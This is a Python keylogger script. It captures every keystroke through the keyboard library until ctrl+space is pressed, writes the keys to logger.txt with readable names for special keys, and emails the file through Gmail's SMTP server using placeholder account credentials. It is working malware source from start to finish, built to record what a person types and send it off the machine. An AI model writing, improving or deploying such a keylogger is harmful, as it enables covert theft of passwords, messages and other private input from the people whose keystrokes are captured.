import keyboard
import smtplib


keyboard_red = []
s = smtplib.SMTP('smtp.gmail.com', 587)
txt_file = open('logger.txt', 'r')

def send_logs():
    s.starttls()
    s.login("EMAIL_ID_USER@gmail.com", "EMAIL_ID_PASSWORD")
    message = txt_file.read()
    s.sendmail("SENDER_EMAIL", "RECEIVER_EMAIL", message)
    s.quit()

def logger():
    while True:
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN and not keyboard.is_pressed('ctrl+space'):
            keyboard_red.append(event)
        elif keyboard.is_pressed('ctrl+space'):
            break

    with open('logger.txt', 'w') as Writer:
        for event in keyboard_red:
            if event.name == 'space':
                event.name = " "
            elif event.name == 'shift':
                event.name = ""
            elif event.name == 'ctrl':
                event.name = ""
            elif event.name == 'enter':
                event.name = " \n"
            elif event.name == 'backspace':
                event.name = "\n <- \n "
            elif event.name == 'alt':
                event.name = ""
            elif event.name == 'windows':
                event.name = "\n windows \n"
            elif event.name == 'caps lock':
                event.name = "\n caps \n"
            elif event.name == 'tab':
                event.name = "\n tab \n"
            elif event.name == 'left windows':
                event.name = "\n win \n"
            elif event.name == 'print screen':
                event.name = "\n ScreenShot \n"
            elif event.name == 'scroll lock':
                event.name = '\n locked \n'
            elif event.name == 'pause':
                event.name = ' || '
                
            Writer.write(f"{event.name}")
    send_logs()      

if __name__ == "__main__":
    logger()
